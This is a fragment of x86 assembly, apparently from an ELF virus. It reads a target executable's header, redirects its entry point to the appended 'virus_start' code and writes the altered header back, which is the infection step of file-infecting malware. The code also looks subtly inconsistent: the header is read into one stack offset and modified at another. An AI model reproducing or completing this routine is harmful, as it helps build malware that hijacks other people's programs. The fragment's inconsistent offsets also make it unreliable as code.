...
copy_ELF_header_into_memory:
	...
	mov eax, dword[ebp-4]				;eax=fd
	lea ebx, [ebp-20]					;we will copy to [ebp-20] the header		
	read eax, ebx, 52					
	cmp eax, 52 						;check if header was completly loaded			
	jne failure
modify_elf_header:
	lea eax, [ebp-72]
	add eax, ENTRY_POINT_OFFSET
	mov ebx, dword[eax]
	mov ecx, dword[ebp-12]				;length of file 
	add ecx, 0x08048000					;addr on virtual memory
	add ecx, virus_start-_start			;offset of _start
	mov dword[eax], ecx					;set new entry point

write_back_header_into_elf:
	mov eax, dword[ebp-4]				;eax=fd
	lea ebx, [ebp-20]				;ebp-20 = addr to header in memory 			
	write eax, ebx ,52 
	cmp eax, 52 								
	jne failure
close_file:
